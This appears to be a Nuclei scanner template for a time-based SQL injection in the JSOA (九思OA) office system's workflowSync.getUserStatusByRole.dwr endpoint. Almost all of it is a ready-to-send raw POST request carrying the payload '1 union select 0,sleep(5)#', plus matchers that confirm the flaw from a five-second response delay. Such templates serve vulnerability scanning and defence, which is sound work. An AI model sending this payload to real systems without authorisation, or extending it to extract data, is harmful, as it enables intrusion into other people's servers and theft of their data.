id: jsoa-workflowsync-sqli

info:
  name: JSOA workflowSync.getUserStatusByRole.dwr - SQL Injection
  author: qwtd
  severity: high
  tags: 九思OA

http:
  - raw:
      - |
        POST /jsoa/workflow/dwr/exec/workflowSync.getUserStatusByRole.dwr HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
        Accept: */*
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Content-Type: application/x-www-form-urlencoded; charset=utf-8
        Connection: close

        callCount=1
        c0-scriptName=workflowSync
        c0-methodName=getUserStatusByRole
        c0-id=1
        c0-param0=string:1
        c0-param1=string:1 union select 0,sleep(5)#
        xml=true

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "DWREngine"
      - type: status
        status:
          - 200
      - type: dsl
        dsl:
          - "duration>=5"
